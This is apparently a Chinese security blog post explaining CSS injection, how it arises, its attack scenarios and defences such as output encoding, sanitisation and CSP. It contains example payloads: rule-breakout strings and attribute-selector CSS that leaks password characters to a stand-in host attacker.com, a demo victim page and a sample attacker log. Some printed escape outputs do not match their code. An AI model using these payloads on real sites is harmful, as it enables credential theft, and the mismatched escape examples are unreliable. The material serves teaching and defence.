---
title: CSS 注入 (CSS Injection) 详解
date: 2025-07-31 06:24:00
tags:
    - 2025
    - 计算机网络
    - 网络安全
categories:
    - 计算机网络
    - 网络安全
---
> **CSS 注入 (CSS Injection)** 是一种客户端攻击技术，攻击者通过在网页中注入恶意的 Cascading Style Sheets (CSS) 代码，从而实现对页面样式、布局的篡改，甚至是**窃取用户信息**、进行**用户行为监控**、绕过某些安全机制等目的。它与常见的 XSS (Cross-Site Scripting) 攻击有所不同，CSS 注入本身不会直接执行 JavaScript 代码，但其危害不容小觑。

{% note info %}
CSS 注入通常发生在 Web 应用程序未能正确净化或编码用户提供的输入，并将其不加识别地插入到 HTML `<style>` 标签、HTML 元素的 `style` 属性或外部 CSS 文件链接中时。它的强大之处在于能够利用 CSS 选择器和属性的特性，实现一些意想不到的攻击效果。
{% endnote %}
------

## 一、CSS 注入的产生机制

CSS 注入的核心在于攻击者能够控制页面中 CSS 的一部分或全部。这通常发生在以下几种情况：

1.  **用户输入直接插入 `<style>` 标签内部**：
    当应用程序允许用户输入的数据直接被渲染到 HTML 页面中的 `<style>` 标签内部时，攻击者可以闭合现有 CSS 规则并注入新的恶意 CSS。
    ```html
    <style>
        /* 应用程序提供的样式 */
        .user-text {
            color: {{ user_supplied_color }}; /* 易受攻击点 */
        }
    </style>
    ```
    如果 `user_supplied_color` 是 `red; } .malicious-class { background: url('http://attacker.com/leak'); `，则会闭合 `color` 属性，并注入新的样式规则。

2.  **用户输入插入 HTML 元素的 `style` 属性**：
    当应用程序允许用户输入的数据被渲染到 HTML 元素的 `style` 属性中时。
    ```html
    <div style="background-color: {{ user_supplied_background }};">
        <p>This is content.</p>
    </div>
    ```
    如果 `user_supplied_background` 是 `blue; float: none; background-image: url('data:image/svg+xml,<svg onload=alert(1)>');`，可能会导致样式破坏甚至尝试 XSS (尽管浏览器通常会阻止 `data` URL 中的脚本)。

3.  **用户输入作为 CSS 属性的值**：
    特别是那些接受 `url()` 函数的 CSS 属性（如 `background-image`, `border-image`, `cursor`, `list-style-image`, `content` 在 `:before` / `:after` 中 `url()` ）。
    ```css
    .profile-image {
        background-image: url('{{ user_supplied_image_url }}'); /* 易受攻击点 */
    }
    ```
    如果 `user_supplied_image_url` 是 `evil.com/leak.png?data=...`，攻击者可以控制图片请求的 URL。

4.  **用户输入作为外部样式表的链接**：
    虽然不如直接注入常见，但如果应用程序动态生成 `<link>` 标签或 `@import` 规则时使用了未净化的用户输入，攻击者可以引入自己的恶意样式表。
    ```html
    <link rel="stylesheet" href="{{ user_supplied_css_path }}">
    ```
    或者在 CSS 文件内部：
    ```css
    @import url("{{ user_supplied_css_path }}");
    ```
    攻击者可以指向一个由他们控制的域名上的 CSS 文件。

## 二、CSS 注入的潜在危害与攻击场景

CSS 注入的攻击能力常常被低估，它可以实现以下多种恶意目的：

### 2.1 数据窃取 (Data Exfiltration)

这是 CSS 注入最强大和最令人担忧的能力之一。攻击者可以利用 CSS 选择器，**根据页面上某个元素的特定属性值，触发一个外部的 HTTP 请求，从而将该属性值“泄露”给攻击者。**

**原理**：CSS 属性选择器允许我们根据 HTML 元素的属性（如 `value`, `placeholder`, `data-*` 属性等）是否存在或其值的一部分来应用样式。当一个选择器匹配成功时，通常会应用相应的样式。攻击者可以利用那些会引起网络请求的 CSS 属性，如 `background-image: url(...)` 或 `list-style-image: url(...)`。

**攻击示例：窃取用户输入的密码 (键盘记录)**

假设有一个登录表单，其中密码输入框的 `name` 是 `password`，且当用户输入时，其 `value` 属性也会被更新。攻击者可以注入以下 CSS：

```css
/* 注入的恶意 CSS */
input[name="password"][value^="a"] { /* 如果密码以 'a' 开头 */
    background-image: url("http://attacker.com/leak?c=a"); /* 触发请求，泄露首字符为 'a' */
}
input[name="password"][value^="p"] { /* 如果密码以 'p' 开头 */
    background-image: url("http://attacker.com/leak?c=p");
}
/* ... 对所有可能的字符 (a-z, A-Z, 0-9, 符号) 都创建一条规则 ... */

input[name="password"][value$="a"] { /* 如果密码以 'a' 结尾 */
    background-image: url("http://attacker.com/leak?last_c=a");
}
/* ... */
```
通过逐个字符尝试，并监听 `attacker.com` 接收到的请求，攻击者可以逐步推断出受害者输入的密码。这是一种基于时间的盲注攻击。

**更精细的键盘记录（通过探测密码长度和每个位置上的字符）：**

```css
/* 探测密码长度 */
input[name="password"][value=""] { background-image: url("http://attacker.com/len?len=0"); }
input[name="password"][value$="a"] { background-image: url("http://attacker.com/leak?c=a"); }
input[name="password"][value*="a"] { background-image: url("http://attacker.com/leak?c=a"); }
/* ... 针对每个可能的字符 a-z, A-Z, 0-9 等 */

/* 探测第一个字符 */
input[name="password"][value^="a"] { background-image: url("http://attacker.com/char?pos=1&char=a"); }
input[name="password"][value^="b"] { background-image: url("http://attacker.com/char?pos=1&char=b"); }
/* ... */

/* 探测第二个字符 */
input[name="password"][value^="a_any_char"] {  /* 这里的 '_' 是占位符，实际需要更复杂的选择器组合或利用不同的 CSS 触发点 */ }
/* 这种方法对探测后续字符需要更复杂的 CSS 技巧，例如利用 `:not()` 选择器或组合多个规则 */
```

**示例代码 (HTML/CSS for keypress logging):**

```html
<!-- index.html (模拟受害者页面) -->
<!DOCTYPE html>
<html>
<head>
    <title>登录页面</title>
    <!-- 假设这里存在 CSS 注入点，用户输入可以被恶意插入 -->
    <style>
        /* 这里是恶意注入的 CSS */
        /**
         * 恶意 CSS 注入点
         * 假设用户输入 `red; } input[name="password"][value$="a"] { background-image: url("http://attacker.com/log?key=a"); }`
         */
         .some-user-controlled-style {
             color: blue; /* 用户输入的颜色，实际会被闭合 */
         }

        /* 攻击者注入的一部分，用于探测密码 */
        input[name="password"][value$="a"] { background-image: url("http://attacker.com/log?key=a"); }
        input[name="password"][value$="b"] { background-image: url("http://attacker.com/log?key=b"); }
        input[name="password"][value$="c"] { background-image: url("http://attacker.com/log?key=c"); }
        /* ... 对所有可能的字符进行探测，当用户输入时，每输入一个字符都会匹配到规则 */

        /* 探测密码长度，例如通过 input[value*="..."] + 计数器 */
        /* input[name="password"][value=""] { background-image: url("http://attacker.com/len?len=0"); } */
        /* input[name="password"][value*="......."] { background-image: url("http://attacker.com/len?len=8+"); } */
    </style>
</head>
<body>
    <h1>请登录</h1>
    <form>
        <label for="username">用户名:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">密码:</label>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="登录">
    </form>

    <script>
        // 模拟用户输入实时绑定到 value 属性 (通常密码框不会这样做，但为了演示，这里模拟)
        const passwordInput = document.getElementById('password');
        passwordInput.addEventListener('input', function() {
            // 在实际场景中，input[value] 属性通常不会实时更新，
            // 攻击者需要寻找其他可以实时反映用户输入，且会出现在 DOM 中的属性，
            // 或者利用一些特殊的浏览器行为。
            // 某些框架 (如 Angular/Vue) 的双向绑定可能导致 value 属性更新。
            // 另一个常见攻击点是 CSS 中的 :focus 或 :hover 伪类。
            console.log("Password value:", this.value);
            // 真实攻击中，这里的 console.log 不存在，攻击者只依赖 CSS 规则触发请求。
        });
    </script>
</body>
</html>
```

**攻击者日志示例 (attacker.com/log)**：

```
GET /log?key=p HTTP/1.1
Host: attacker.com

GET /log?key=a HTTP/1.1
Host: attacker.com

GET /log?key=s HTTP/1.1
Host: attacker.com

GET /log?key=s HTTP/1.1
Host: attacker.com

GET /log?key=w HTTP/1.1
Host: attacker.com

GET /log?key=o HTTP/1.1
Host: attacker.com

GET /log?key=r HTTP/1.1
Host: attacker.com

GET /log?key=d HTTP/1.1
Host: attacker.com
```
通过观察这些请求，攻击者可以逐个字符地重构出受害者输入的密码 "password"。

### 2.2 页面篡改与钓鱼 (Page Defacement & Phishing)

攻击者可以使用注入的 CSS 来修改页面的视觉外观，隐藏、移动或重新定位元素，从而：

*   **隐藏关键信息**：使用 `display: none;` 隐藏登录页面上的安全提示或警告。
*   **覆盖或替换内容**：使用 `:before` / `:after` 伪元素和 `content` 属性插入攻击者控制的文本或图片，或者通过 `position: absolute;` 将伪造的表单覆盖在原始表单之上，诱导用户输入敏感信息。
*   **改变布局**：将重要的按钮或链接移动到不显眼的位置，或者使页面无法正常使用。

### 2.3 信息探测 (Information Gathering)

虽然不如数据窃取直接，但 CSS 注入也可以用于收集关于用户或应用程序的信息：

*   **探测用户是否访问过某个链接**：利用 `a:visited` 伪类，虽然现代浏览器已经限制了 `a:visited` 的样式修改，以防止这种攻击，但历史版本或某些浏览器仍可能存在风险。
*   **探测用户是管理员还是普通用户**：如果应用程序根据用户角色添加特定的 CSS 类（例如 `<body class="admin-user">`），攻击者可以编写针对这些类的 CSS 规则，并在它们被触发时发送请求。
*   **探测特定元素是否存在**：通过 `div#some-element { background-image: url('http://attacker.com/element_exists'); }` 来确认页面上是否存在某个特定 ID 的元素。

### 2.4 绕过 CSP (Content Security Policy) (有限情况)

在某些配置不当或宽松的 CSP 下，CSS 注入可能可以用于绕过其安全防护。例如，如果 `style-src 'unsafe-inline'` 被允许，但 `script-src` 没有，那么攻击者可能无法直接执行 JavaScript。然而，通过上面描述的数据窃取技术，攻击者依然可以获取敏感数据。

### 2.5 UI 重绘/点击劫持 (UI Redressing/Clickjacking)

通过精确地操纵元素的 `top`, `left`, `width`, `height`, `opacity`, `z-index` 属性，攻击者可以将透明的恶意元素叠加在受害者页面的关键按钮或链接之上，诱骗用户点击。

## 三、CSS 注入的识别与检测

1.  **人工代码审计 (Manual Code Review)**：
    审查所有用户输入可能接触到 HTML `<style>` 标签、`style` 属性或直接作为 CSS 属性值的地方。特别关注那些在 HTML 模板中直接插入用户输入且未进行上下文敏感编码的位置。
2.  **SAST (Static Application Security Testing) 工具**：
    部分 SAST 工具能够检测到将用户输入直接渲染到这些敏感位置的代码模式。
3.  **DAST (Dynamic Application Security Testing) 工具**：
    通过模糊测试 (Fuzzing) 输入，向应用程序发送包含恶意 CSS 片段的请求，然后分析响应，看是否产生了非预期的样式变化或外部 HTTP 请求。
4.  **Content Security Policy (CSP) Reporting**：
    如果配置了 CSP 的报告模式，当注入的 CSS 尝试加载外部资源时，可能会触发 CSP 报告，帮助发现这类攻击。

## 四、CSS 注入的防御策略

防御 CSS 注入的最核心原则是**对所有用户提供的，要插入到 HTML 或 CSS 上下文中的数据进行严格的上下文敏感编码或白名单清理。**

### 4.1 输出编码/转义 (Output Encoding/Escaping)

这是防御 CSS 注入最关键的措施。根据数据插入的位置选择合适的编码方式：

*   **HTML 上下文转义**：
    当用户输入将要插入到 HTML 标签的内容或属性值中（而非 `style` 属性内）时，需要进行 HTML 实体编码。但这并不能直接防御 CSS 注入本身，主要是防止 XSS。
    *   **Python 示例**：
        ```python
        import html

        user_input = "<script>alert('XSS');</script>"
        encoded_input = html.escape(user_input) # &lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;
        ```
    *   **Go 示例**：
        ```go
        import "html"

        userInput := "<script>alert('XSS');</script>"
        encodedInput := html.EscapeString(userInput) // &lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;
        ```

*   **CSS 上下文转义**：
    当用户输入将要作为 CSS 规则的一部分（例如在 `<style>` 标签内或 `style` 属性中作为值）时，需要进行 CSS 编码。这通常意味着将非字母数字字符转义为像 `\xx` 或 `\uxxxx` 这样的格式。
    ```css
    /* 原始 CSS */
    .user-class {
        width: 100px;
        color: {{ user_input }} ;
    }
    /* 假设 user_input = 'red; } .malicious { color: blue;' */
    /* 攻击者想要的：
    .user-class {
        width: 100px;
        color: red;
    }
    .malicious {
        color: blue;
    }
    */
    /* 防御后的输出：
    .user-class {
        width: 100px;
        color: red\3B\20\7D\20\2E\6D\61\6C\69\63\69\6F\75\73\20\7B\20\63\6F\6C\6F\72\3A\20\62\6C\75\65\3B;
    }
    */
    ```
    *   **Python 示例 (需要自定义函数或第三方库，Python标准库没有直接的 CSS 转义函数)**：
        ```python
        def css_escape(s):
            escaped_chars = []
            for char in s:
                if '0' <= char <= '9' or 'a' <= char <= 'z' or 'A' <= char <= 'Z':
                    escaped_chars.append(char)
                else:
                    escaped_chars.append(f'\\{ord(char):x}')
            return ''.join(escaped_chars)

        user_input_css = "red; } .malicious { color: blue;"
        escaped_css = css_escape(user_input_css)
        print(escaped_css)
        # 输出: red\3b \7d \20 \2e \6d \61 \6c \69 \63 \69 \6f \75 \73 \20 \7b \20 \63 \6f \6c \6f \72 \3a \20 \62 \6c \75 \65 \3b
        ```
    *   **Go 示例 (同样需要自定义函数或第三方库)**：
        ```go
        package main

        import (
        	"fmt"
        	"strconv"
        )

        func cssEscape(s string) string {
        	var escapedChars []rune
        	for _, r := range s {
        		if ('0' <= r && r <= '9') || ('a' <= r && r <= 'z') || ('A' <= r && r <= 'Z') {
        			escapedChars = append(escapedChars, r)
        		} else {
        			escapedChars = append(escapedChars, '\\')
        			escapedChars = append(escapedChars, []rune(strconv.FormatInt(int64(r), 16))...)
        			escapedChars = append(escapedChars, ' ') // CSS escape should include a space if next char is hex digit
        		}
        	}
        	return string(escapedChars)
        }

        func main() {
        	userInputCSS := "red; } .malicious { color: blue;"
        	escapedCSS := cssEscape(userInputCSS)
        	fmt.Println(escapedCSS)
        	// 输出: red\3b \7d \2e \6d \61 \6c \69 \63 \69 \6f \75 \73 \7b \63 \6f \6c \6f \72 \3a \62 \6c \75 \65 \3b
        }
        ```

### 4.2 清理/白名单 (Sanitization/Whitelisting)

如果必须允许用户输入包含一些 HTML 或 CSS，则应该采取白名单策略。只允许已知安全的标签、属性和 CSS 属性/值。

*   **HTML 清理**：使用专业的 HTML 清理库（如 Java 的 Jsoup，Python 的 Bleach 或 DOMPurify.js (前端)），只保留白名单中的 HTML 标签和属性，移除其他所有内容。
*   **CSS 清理**：如果允许用户自定义 CSS，则需要一个 CSS 解析器来检查并只允许白名单中的 CSS 属性和值。绝不允许用户输入改变 CSS 规则的结构。

### 4.3 内容安全策略 (Content Security Policy, CSP)

CSP 是一种防御纵深机制，虽然不能完全阻止 CSS 注入，但可以限制其危害。

*   `style-src`：限制可以加载样式表的来源（例如 `style-src 'self' https://trusted.cdn.com;`）。
*   **避免 `'unsafe-inline'`**：尽量不要在 `style-src` 中使用 `'unsafe-inline'`，因为它允许页面中的任意内联样式，这为 CSS 注入打开了大门。如果必须使用，应确保所有内联样式都经过严格的编码或清理。

### 4.4 输入验证 (Input Validation)

在服务器端，对用户输入进行严格的验证。根据预期的输入类型，限制其长度、格式和允许的字符集。
例如，如果期望一个颜色值，就只接受有效的颜色格式（如 `red` 或 `#FFFFFF` 或 `rgb(0,0,0)`），而不是任意字符串。

### 4.5 最小权限原则

如果业务功能允许，尽可能避免让用户控制任何样式输出。如果必须提供这种灵活性，则应将其限制在最小的功能集内，并结合上述所有防御措施。

## 五、总结

CSS 注入是一种复杂且常常被忽视的客户端漏洞。虽然它不像 XSS 那样直接执行 JavaScript，但它可以利用 CSS 本身的强大功能，实现页面篡改、敏感信息窃取（如键盘记录密码）、用户行为监控等多种危害。

防御 CSS 注入的关键在于：
1.  **上下文敏感的输出编码**：根据用户输入被插入到 HTML 或 CSS 上下文，选择正确的编码方式。CSS 上下文的编码尤其重要和复杂。
2.  **严格的输入验证和白名单清理**：在服务器端对用户输入进行验证，只允许已知安全的输入。
3.  **内容安全策略 (CSP) 作为纵深防御**：虽然不是主要防御，但可以限制攻击的范围和冲击。

开发者在处理任何用户输入并将其渲染到页面时，都应保持高度警惕，始终假设用户输入是恶意的，并采取适当的防御措施。